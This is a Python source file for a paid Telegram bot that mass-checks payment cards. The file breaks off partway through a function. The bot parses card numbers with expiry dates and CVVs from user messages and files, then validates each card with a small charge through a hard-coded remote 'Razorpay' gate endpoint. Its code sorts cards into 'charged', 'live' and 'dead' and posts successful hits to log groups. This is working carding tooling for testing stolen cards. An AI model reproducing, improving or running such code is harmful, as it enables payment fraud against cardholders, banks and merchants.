import asyncio
import random
import re
import logging
import aiohttp
import time
import string
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO

from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

import database
from bin import get_bin_info
from payments import PLANS

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RZ_API_BASE_URL = "http://177.7.48.46:1000/razorpay/cc="

HIT_LOG_GROUP_ID       = -1003838614236
EXTRA_CHARGED_GROUP_ID = -1003991915326
BUTTON_LOCK_SECONDS    = 30
MAX_CONCURRENT_CARDS   = 20
CARD_TIMEOUT_SECONDS   = 180

APPROVED_EMOJI_ID        = "4958610528588008305"
DECLINED_EMOJI_ID        = "4956612582816351459"
ERROR_EMOJI_ID           = "5447644880824181073"
CARD_EMOJI_ID            = "5447453226498552490"
PRO_EMOJI_ID             = "6298678524379137990"
GATE_EMOJI_ID            = "5801044672658805468"
BUTTON_EMOJI_ID          = "5465465194056525619"
STATUS_CHECKING_EMOJI_ID = "6102447314075389214"
STATUS_STOPPED_EMOJI_ID  = "6179444193518162239"
STATUS_FINISHED_EMOJI_ID = "4958610528588008305"
DEFAULT_PLAN_EMOJI_ID    = "5267500801240092311"
BUY_EMOJI_ID             = "5935795874251674052"
CHARGED_EMOJI_IDS = [
    "5801154993188770160",
    "4956739572114392015",
    "5803233241963959320",
    "5462902520215002477",
    "5787435351521889877",
    "5323674506705785412",
    "5801005158959683238",
    "5436143465211640305",
    "5800688138833629633",
    "5891044423856296980",
    "5436068999068662274",
    "5427168083074628963",
]

BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_DEAD_EMOJI_ID    = "5042112436648281096"
BTN_LIVE_EMOJI_ID    = "5039793437776282663"
BTN_STOP_EMOJI_ID    = "6179444193518162239"
BTN_ALL_EMOJI_ID     = "4956324463525233747"

MRZ_SESSIONS   = {}
MRZ_TASKS      = {}
MRZ_COMPLETED  = {}

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STATUS CONSTANTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATUS_CHARGED       = "charged"
STATUS_APPROVED      = "approved"
STATUS_DECLINED      = "declined"
STATUS_ERROR         = "error"
STATUS_TIMEOUT       = "timeout"
STATUS_INDIA_BLOCKED = "india_blocked"

DECLINED_STATUSES = {STATUS_DECLINED, STATUS_INDIA_BLOCKED}
ERROR_STATUSES    = {STATUS_ERROR, STATUS_TIMEOUT}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MrzResultCallback(CallbackData, prefix="mrzr"):
    session_id: str
    result_type: str

class MrzStopCallback(CallbackData, prefix="mrzs"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SMALL CAPS HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
    'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
    'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
    'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
    'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ',
    'z': 'ᴢ',
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD FOR NO PLAN USERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def buy_now_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                {
                    "text": "Buy Now",
                    "callback_data": "buy_now",
                    "style": "primary",
                    "icon_custom_emoji_id": BUY_EMOJI_ID
                }
            ]
        ]
    )


def to_small_caps_title(text: str) -> str:
    result      = ""
    is_new_word = True
    for ch in text:
        if ch == '_':
            result += '_'; is_new_word = True
        elif ch.lower() in SMALL_CAPS_MAP:
            result += ch.upper() if is_new_word else SMALL_CAPS_MAP[ch.lower()]
            is_new_word = False
        else:
            result += ch; is_new_word = False
    return result

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def build_user_link(user_obj) -> str:
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PLAN EMOJI HELPER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def get_user_plan_name(user_id: int) -> str:
    try:
        is_active = await asyncio.to_thread(database.is_premium_active, user_id)
        if not is_active:
            return "TRIAL"
        def _sync():
            conn = database.get_connection()
            cur  = conn.cursor()
            cur.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cur.fetchone()
            conn.close()
            return row['current_plan'].upper() if row and row.get('current_plan') else "PREMIUM"
        return await asyncio.to_thread(_sync)
    except Exception:
        return "PREMIUM"

async def get_user_plan_emoji_id(user_id: int) -> str:
    try:
        is_active = await asyncio.to_thread(database.is_premium_active, user_id)
        if not is_active:
            return DEFAULT_PLAN_EMOJI_ID
        def _sync():
            conn = database.get_connection()
            cur  = conn.cursor()
            cur.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cur.fetchone()
            conn.close()
            return row.get('current_plan') if row else None
        plan_key = await asyncio.to_thread(_sync)
        if plan_key and plan_key in PLANS:
            return PLANS[plan_key].get("emoji_id", DEFAULT_PLAN_EMOJI_ID)
        return DEFAULT_PLAN_EMOJI_ID
    except Exception as e:
        logging.error(f"[MRZ] Error fetching plan emoji for {user_id}: {e}")
        return DEFAULT_PLAN_EMOJI_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING & VALIDATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    cards = []
    seen  = set()
    for pattern in patterns:
        for match in re.findall(pattern, text):
            num, month, year, cvv = match
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            card_str = f"{num}|{month}|{year}|{cvv}"
            if card_str not in seen:
                seen.add(card_str)
                cards.append(card_str)
    return cards

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, ch in enumerate(card_number[::-1]):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100:
            return True
        if ey == now.year % 100 and em < now.month:
            return True
        return False
    except ValueError:
        return True

def is_india_card(bin_info: dict) -> bool:
    country_name = (bin_info.get("country") or "").lower()
    country_code = (bin_info.get("country_code") or "").upper()
    return "india" in country_name or country_code == "IN"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_session_stopped(session_id: str) -> bool:
    s = MRZ_SESSIONS.get(session_id)
    if not s:
        return True
    return s.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    s = MRZ_SESSIONS.get(session_id)
    if not s:
        return False
    return (time.time() - s.get('start_time', 0)) < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    s = MRZ_SESSIONS.get(session_id)
    if not s:
        return 0
    remaining = BUTTON_LOCK_SECONDS - (time.time() - s.get('start_time', 0))
    return max(0, int(remaining) + 1)

def get_session_data(session_id: str) -> Optional[dict]:
    return MRZ_SESSIONS.get(session_id) or MRZ_COMPLETED.get(session_id)

def log_hit_to_mrz(user_id, username, first_name):
    try:
        with open("mrz.txt", "a", encoding="utf-8") as f:
            f.write(f"{user_id}|{username or 'None'}|{first_name or 'Unknown'}\n")
    except Exception as e:
        logging.error(f"[MRZ] Error writing to mrz.txt: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FILE DOWNLOAD HELPER  (fixes HTTP Client timeout error)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def download_telegram_file(bot: Bot, file_id: str, max_retries: int = 3) -> Optional[bytes]:
    """
    Download a file from Telegram using aiohttp for BOTH the getFile API call
    and the actual file download — aiogram's internal HTTP client is never used,
    so its timeout cannot interfere.
    """
    token   = bot.token
    timeout = aiohttp.ClientTimeout(total=120, connect=30)

    for attempt in range(1, max_retries + 1):
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # Step 1: resolve file_path via Bot API (pure aiohttp, no aiogram HTTP)
                get_file_url = f"https://api.telegram.org/bot{token}/getFile?file_id={file_id}"
                async with session.get(get_file_url) as r:
                    if r.status != 200:
                        raise RuntimeError(f"getFile returned HTTP {r.status}")
                    data = await r.json()
                    if not data.get("ok"):
                        raise RuntimeError(f"getFile error: {data.get('description', 'unknown')}")
                    file_path = data["result"]["file_path"]

                # Step 2: download the actual file
                tg_url = f"https://api.telegram.org/file/bot{token}/{file_path}"
                async with session.get(tg_url) as r:
                    if r.status == 200:
                        return await r.read()
                    raise RuntimeError(f"HTTP {r.status} from Telegram file server")

        except asyncio.TimeoutError:
            if attempt == max_retries:
                raise asyncio.TimeoutError("File download timed out after all retries")
            logging.warning(f"[MRZ] File download timeout (attempt {attempt}/{max_retries}), retrying...")
            await asyncio.sleep(3.0 * attempt)
        except Exception as e:
            if attempt == max_retries:
                raise
            logging.warning(f"[MRZ] File download error (attempt {attempt}/{max_retries}): {e}, retrying...")
            await asyncio.sleep(3.0 * attempt)
    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_rz_api(cc_formatted: str) -> dict:
    url = f"{RZ_API_BASE_URL}{cc_formatted}"
    try:
        timeout = aiohttp.ClientTimeout(total=CARD_TIMEOUT_SECONDS)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "status":   data.get("status",   STATUS_ERROR),
                        "response": data.get("response", "Unknown Error"),
                    }
                return {"status": STATUS_ERROR, "response": f"HTTP {resp.status}"}
    except asyncio.TimeoutError:
        return {"status": STATUS_TIMEOUT, "response": "Connection Timed Out"}
    except aiohttp.ClientError as e:
        return {"status": STATUS_ERROR, "response": f"Connection Failed: {str(e)[:50]}"}
    except Exception as e:
        return {"status": STATUS_ERROR, "response": f"Unexpected Error: {str(e)[:50]}"}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

STATUS_DISPLAY_MAP = {
    STATUS_CHARGED:       "Cʜᴀʀɢᴇᴅ 💎",
    STATUS_APPROVED:      "Lɪᴠᴇ ✅",
    STATUS_DECLINED:      "Dᴇᴄʟɪɴᴇᴅ ❌",
    STATUS_INDIA_BLOCKED: "Rᴇɢɪᴏɴ Bʟᴏᴄᴋ 🌍",
    STATUS_ERROR:         "Eʀʀᴏʀ ⚠️",
    STATUS_TIMEOUT:       "Tɪᴍᴇᴏᴜᴛ ⏱️",
}

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label, type_emoji = "Cʜᴀʀɢᴇᴅ", "💎"
    elif result_type == "live":
        cards_list = session.get('approved_cards', [])
        type_label, type_emoji = "Lɪᴠᴇ", "✅"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label, type_emoji = "Dᴇᴀᴅ", "❌"
    else:
        cards_list = (session.get('charged_cards', []) + session.get('approved_cards', [])
                      + session.get('dead_cards', []) + session.get('error_cards', []))
        type_label, type_emoji = "Aʟʟ", "📁"

    total_count  = len(cards_list)
    user_display = f"{(user_obj.first_name if user_obj else 'User')} ({plan_name})"

    lines = [
        f"[₪] Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹",
        "━━━━━━━━━━━━━━",
        f"      Rᴇsᴜʟᴛ ➛ {type_label} {type_emoji}",
        f"      Tᴏᴛᴀʟ ➛ {total_count}",
        "━━━━━━━━━━━━━━",
    ]

    if total_count == 0:
        lines.append("No cards found for this category.")
    else:
        for card_data in cards_list:
            cc       = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            status   = STATUS_DISPLAY_MAP.get(card_data.get('status', ''), "Uɴᴋɴᴏᴡɴ ❓")
            bin_info = card_data.get('bin_info', {}) or {}
            scheme   = bin_info.get('scheme', 'N/A')
            bank     = bin_info.get('bank', 'N/A')
            country  = bin_info.get('country', 'N/A')
            flag     = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}".strip()
            lines += [
                f"Cᴀʀᴅ ➛ {cc}",
                f"Sᴛᴀᴛᴜs ➛ {status}",
                f"Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹",
                f"Rᴀᴡ ➛ {response}",
                f"Bʀᴀɴᴅ ➛ {scheme}",
                f"Issᴜᴇʀ ➛ {bank}",
                f"Cᴏᴜɴᴛʀʏ ➛ {country_display}",
                f"Uꜱᴇʀ ➛ {user_display}",
                "━━━━━━━━━━━━━━",
            ]

    content     = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map  = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename  = f"MRZ_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM SENDERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _bot_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        {"text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆", "url": "https://t.me/CARDXV4_BOT",
         "style": "primary", "icon_custom_emoji_id": BUTTON_EMOJI_ID}
    ]])

async def send_hit_log_to_group(bot: Bot, response_msg: str, user_obj, plan_emoji_id: str, hit_type: str):
    user_link    = build_user_link(user_obj)
    raw_styled   = to_small_caps_title(str(response_msg))
    if hit_type == STATUS_CHARGED:
        charged_emoji_id = get_random_charged_emoji()
        header = f'<b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>'
    else:
        header = f'<b>Lɪᴠᴇ <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>'
    text = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ {header}\n'
        f'<b>Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹ <tg-emoji emoji-id="{GATE_EMOJI_ID}">🛒</tg-emoji></b>\n'
        f'<b>Rᴀᴡ ➛ {raw_styled}</b>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=text, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[MRZ] Hit log error: {e}")

async def send_hit_to_user(bot: Bot, session_data: dict, cc_formatted: str, bin_data: dict,
                           response_msg: str, user_obj, plan_emoji_id: str, hit_type: str):
    user_link    = build_user_link(user_obj)
    dev_link     = '<a href="https://t.me/FailureFr_07">kคli liຖนxx</a>'
    raw_styled   = to_small_caps_title(str(response_msg))
    scheme       = (bin_data or {}).get('scheme', 'N/A')
    bank         = (bin_data or {}).get('bank', 'N/A')
    country      = (bin_data or {}).get('country', 'N/A')
    flag         = (bin_data or {}).get('country_emoji', '')
    bin_info_str = f"{scheme} - {bank} - {flag} {country}".strip(" -")

    if hit_type == STATUS_CHARGED:
        charged_emoji_id = get_random_charged_emoji()
        status_line = f'<b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>'
    else:
        status_line = f'<b>Lɪᴠᴇ <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>'

    text = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ {status_line}\n'
        f'<tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{cc_formatted}</code>\n'
        f'<b>Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹ <tg-emoji emoji-id="{GATE_EMOJI_ID}">🛒</tg-emoji></b>\n'
        f'<b>Rᴀᴡ ➛ {raw_styled}</b>\n'
        f'<b>Iɴꜰᴏ ➛</b> <code>{bin_info_str}</code>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b>Pʀᴏ ➛ {dev_link} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⚡</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=user_obj.id, text=text, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MRZ] Could not DM hit to {user_obj.id}: {e}")
        try:
            await bot.send_message(chat_id=session_data['chat_id'], text=text, parse_mode="HTML",
                                   reply_markup=_bot_button(), disable_web_page_preview=True)
        except Exception:
            pass
    except Exception as e:
        logging.error(f"[MRZ] User DM error: {e}")

async def send_charged_to_extra_group(bot: Bot, cc_formatted: str, bin_data: dict,
                                      response_msg: str, user_obj, plan_emoji_id: str):
    user_link        = build_user_link(user_obj)
    raw_styled       = to_small_caps_title(str(response_msg))
    charged_emoji_id = get_random_charged_emoji()
    scheme           = (bin_data or {}).get('scheme', 'N/A')
    bank             = (bin_data or {}).get('bank', 'N/A')
    country          = (bin_data or {}).get('country', 'N/A')
    flag             = (bin_data or {}).get('country_emoji', '')
    bin_info_str     = f"{scheme} - {bank} - {flag} {country}".strip(" -")
    text = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ <b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{cc_formatted}</code>\n'
        f'<b>Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹ <tg-emoji emoji-id="{GATE_EMOJI_ID}">🛒</tg-emoji></b>\n'
        f'<b>Rᴀᴡ ➛ {raw_styled}</b>\n'
        f'<b>Iɴꜰᴏ ➛</b> <code>{bin_info_str}</code>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[MRZ] Extra group error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS MESSAGE & BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    s  = get_session_data(session_id) or {}
    ac = s.get('approved', 0)
    dc = s.get('dead', 0)
    cc = s.get('charged', 0)
    tc = cc + ac + dc + s.get('errors', 0)
    buttons = [
        [
            {"text": f"Lɪᴠᴇ ({ac})",    "callback_data": MrzResultCallback(session_id=session_id, result_type="live").pack(),    "style": "success", "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID},
            {"text": f"Dᴇᴀᴅ ({dc})",    "callback_data": MrzResultCallback(session_id=session_id, result_type="dead").pack(),    "style": "danger",  "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID},
        ],
        [
            {"text": f"Cʜᴀʀɢᴇᴅ ({cc})", "callback_data": MrzResultCallback(session_id=session_id, result_type="charged").pack(), "style": "primary", "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID},
            {"text": f"Aʟʟ ({tc})",     "callback_data": MrzResultCallback(session_id=session_id, result_type="all").pack(),     "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID},
        ],
    ]
    if is_running:
        buttons.append([{"text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ", "callback_data": MrzStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}])
    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id: str, force: bool = False):
    session = MRZ_SESSIONS.get(session_id)
    if not session:
        return

    now      = time.time()
    last_upd = session.get('last_update_time', 0)
    is_terminal = session['status'] in ("STOPPED", "FINISHED")
    if not force and not is_terminal and (now - last_upd) < 1.0:
        return

    session['last_update_time'] = now
    elapsed     = now - session['start_time']
    minutes     = int(elapsed // 60)
    seconds     = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    if session['status'] == "CHECKING":
        status_line = f'<b><a href="https://t.me/FailureFr_07">[◈]</a> Sᴛᴀᴛᴜs ➛ Cʜᴇᴄᴋɪɴɢ <tg-emoji emoji-id="{STATUS_CHECKING_EMOJI_ID}">🔄</tg-emoji></b>'
    elif session['status'] == "STOPPED":
        status_line = f'<b><a href="https://t.me/FailureFr_07">[◈]</a> Sᴛᴀᴛᴜs ➛ Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{STATUS_STOPPED_EMOJI_ID}">🛑</tg-emoji></b>'
    else:
        status_line = f'<b><a href="https://t.me/FailureFr_07">[◈]</a> Sᴛᴀᴛᴜs ➛ Fɪɴɪsʜᴇᴅ <tg-emoji emoji-id="{STATUS_FINISHED_EMOJI_ID}">✅</tg-emoji></b>'

    charged_emoji_id = get_random_charged_emoji()
    text = (
        f'<b><a href="https://t.me/FailureFr_07">[₪]</a> Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹</b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'      {status_line}\n'
        f'      <b><a href="https://t.me/FailureFr_07">[𖣸]</a> Cʜᴇᴄᴋᴇᴅ ➛ <code>{session["checked"]}/{session["total"]}</code></b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'<b>♘ Aᴘᴘʀᴏᴠᴇᴅ ➛ {session["approved"]} <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>♞ Cʜᴀʀɢᴇᴅ ➛ {session["charged"]} <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<b>Dᴇᴀᴅ ➛ {session["dead"]} <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Eʀʀᴏʀs ➛ {session["errors"]} <tg-emoji emoji-id="{ERROR_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Tɪᴍᴇ ➛ {elapsed_str}</b>'
    )

    is_running = session['status'] == "CHECKING"
    buttons    = get_result_buttons(session_id, is_running=is_running)
    try:
        await bot.edit_message_text(
            chat_id=session['chat_id'], message_id=session['msg_id'],
            text=text, parse_mode="HTML", reply_markup=buttons,
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            logging.warning(f"[MRZ] Progress edit failed: {e}")
    except Exception as e:
        logging.error(f"[MRZ] Progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MrzResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MrzResultCallback):
    try:
        session_id  = callback_data.session_id
        result_type = callback_data.result_type
        session     = get_session_data(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if session_id in MRZ_SESSIONS and is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return

        count_map = {
            "charged": len(session.get('charged_cards', [])),
            "live":    len(session.get('approved_cards', [])),
            "dead":    len(session.get('dead_cards', [])),
        }
        count = count_map.get(result_type,
                              sum(count_map.values()) + len(session.get('error_cards', [])))
        if count == 0:
            names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            await callback.answer(f"❌ No {names.get(result_type, '')} cards found", show_alert=True); return

        await callback.answer("📦 Generating report...", show_alert=False)
        user_obj    = session.get('user_obj')
        plan_name   = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')
        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read(); file_buffer.seek(0)
        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}
        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 ➛ {type_labels.get(result_type, '𝗔𝗹𝗹')} {type_emojis.get(result_type, '📁')}\n"
            f"𝗧𝗼𝘁𝗮𝗹 ➛ <b>{total_count}</b>\n"
            f"𝗚𝗮𝘁𝗲 ➛ 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝟭₹"
        )
        document = types.BufferedInputFile(file=file_content, filename=filename)
        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id, document=document,
                caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id,
            )
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise
    except Exception as e:
        logging.error(f"[MRZ] Result callback error: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(MrzStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MrzStopCallback):
    try:
        session_id = callback_data.session_id
        session    = MRZ_SESSIONS.get(session_id)
        if not session and MRZ_COMPLETED.get(session_id):
            await callback.answer("ℹ️ Session already completed", show_alert=True); return
        if not session:
            await callback.answer("⚠️ Session not found", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True); return

        session['status'] = "STOPPED"
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
        main_task = MRZ_TASKS.get(session_id)
        if main_task and not main_task.done():
            main_task.cancel()

        await callback.answer("🛑 Stopping...", show_alert=False)
        await update_progress_message(callback.bot, session_id, force=True)
    except Exception as e:
        logging.error(f"[MRZ] Stop callback error: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
